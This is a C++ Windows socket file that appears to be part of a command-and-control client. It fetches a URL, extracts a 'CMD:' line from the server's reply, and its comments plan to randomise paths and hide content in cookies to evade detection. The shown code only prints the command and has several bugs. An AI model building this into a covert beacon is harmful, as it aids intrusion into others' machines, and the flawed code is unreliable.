#include <iostream>
#include <string>
#include <sstream>
#include <ws2tcpip.h>
#include "xhttp.h"
#include <WinSock2.h>
#include <map>
#include <cstring>
#include <cstdint>
#include <stdint.h>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")

namespace xhttp {
std::vector<uint32_t> req_body;
std::string cmdstr;
std::string cmdValue;

bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
    std::stringstream ss(url);
    std::string temp;

    // Parse protocol
    getline(ss, protocol, ':');
    if (protocol != "http") {
        std::cerr << "Invalid protocol. Only 'http' protocol is supported." << std::endl;
        return false;
    }
    // Check if there are more characters in the stringstream
    if (ss.peek() == EOF) {
        std::cerr << "Unexpected end of URL." << std::endl;
        return false;
    }
    // Consume "//"
    getline(ss, temp, '/');
    getline(ss, temp, '/');

    // Parse host and port
    getline(ss, host, ':');
    if (host.empty()) {
        std::cerr << "Invalid URL format. Hostname is missing." << std::endl;
        return false;
    }
    std::string port_str;
    getline(ss, port_str, '/');
    if (port_str.empty()) {
        std::cerr << "Invalid URL format. Port number is missing." << std::endl;
        return false;
    }
    port = stoi(port_str);
    // Parse path
    getline(ss, path);
    if (path.empty()) {
        std::cerr << "Invalid URL format. Path is missing." << std::endl;
        return false;
    }
    return true;
}

std::string createCookiesString() {
    // Define the cookies string with dynamic ID
    std::string cookies = "ID=value1; cookie2=value2"; // separate cookies with semicolon

    return cookies;
}

std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies) {
    // Call createCookiesString to get the cookies
    std::string cookiesString = createCookiesString();
    
    return "GET /" + path + " HTTP/1.1\r\n"
           "Host: " + host + "\r\n"
           "Connection: Keep-Alive\r\n"
           "Keep-Alive: timeout=15, max=1000\r\n" // add \r\n at the end
           "Cookie: " + cookiesString + "\r\n"    // add \r\n at the end
           "\r\n";
}

bool initialize_winsock() {
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
}

SOCKET create_socket(const std::string& host, int port) {
    SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
        return INVALID_SOCKET;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(host.c_str());
    serverAddr.sin_port = htons(port);

    if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        return INVALID_SOCKET;
    }

    return ConnectSocket;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////                                       GET  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Randomize the URL path based on common path
// Randomize the parameter names
// Use cookies to send the content
std::string http_get(const std::string& url) {
    std::string protocol, host, path, cookies;
    int port;
    if (!parse_url(url, protocol, host, port, path)) {
        return "";
    }

    if (!initialize_winsock()) {
        return "";
    }

    SOCKET ConnectSocket = create_socket(host, port);
    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return "";
    }

    std::string request = buildRequest(path, host, cookies);

    if (send(ConnectSocket, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Error sending request: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return "";
    }

    std::vector<uint32_t> response_data = receive_data(ConnectSocket);
    for (const auto& data : response_data) {
        char character = static_cast<char>(data); // Convert ASCII value to character
        std::cerr << character;
    }
    std::cerr << std::endl;

    // Here you can process the response data as needed
    // Process the response data using extractCMD
    std::string cmdResponse = extractCMD(response_data);
    std::cerr << "CMD Response: " << cmdResponse << std::endl;
    req_body.clear(); // Clearing req_body vector

    closesocket(ConnectSocket);
    WSACleanup();
    return ""; // Placeholder for response handling
}

std::string extractCMD(const std::vector<uint32_t>& data) {
    // Search for the CMD header
    const char cmdHeader[] = "CMD:";
    auto header_start = std::search(data.begin(), data.end(), std::begin(cmdHeader), std::end(cmdHeader) - 1);
    auto header_end = std::find(header_start, data.end(), '\n');
    
    // Extract the content between CMD header and newline
    std::string cmdResponse(header_start + sizeof(cmdHeader) - 1, header_end);
    
    // Print the extracted command response
    std::cerr << "CMD Response: " << cmdResponse << std::endl;
    
    return cmdResponse;
}

bool extract_content_length(const std::vector<uint32_t>& data, size_t& content_length) {
    // Search for the Content-Length header
    const char content_length_header[] = "Content-Length:";
    auto header_start = std::search(data.begin(), data.end(), std::begin(content_length_header), std::end(content_length_header) - 1);
    if (header_start != data.end()) {
        // Find the end of the header line
        auto header_end = std::find(header_start, data.end(), '\n');
        if (header_end != data.end()) {
            // Extract the content length value
            std::string length_str(header_start + sizeof(content_length_header) - 1, header_end);
            content_length = std::stoul(length_str);

            return true;
        }
    }
    return false;
}

std::vector<uint32_t> receive_data(SOCKET ConnectSocket) {

    constexpr size_t BUFFER_SIZE = 1024;
    char buffer[BUFFER_SIZE];
    size_t read = 0;

    size_t content_length = 0;
    bool found_content_length = false;

    while (true) {
        read = recv(ConnectSocket, buffer, BUFFER_SIZE, 0);
        if (read <= 0) {
            // Either an error occurred or the connection was closed
            break;
        }
        // Append received data to req_body
        req_body.insert(req_body.end(), buffer, buffer + read);

        // Check if we have found the Content-Length header
        if (!found_content_length) {
            found_content_length = extract_content_length(req_body, content_length);
        }

        // Check if we have received the entire body
        if (found_content_length && req_body.size() >= content_length) {
            break;
        }
    }

    return req_body;
}

}

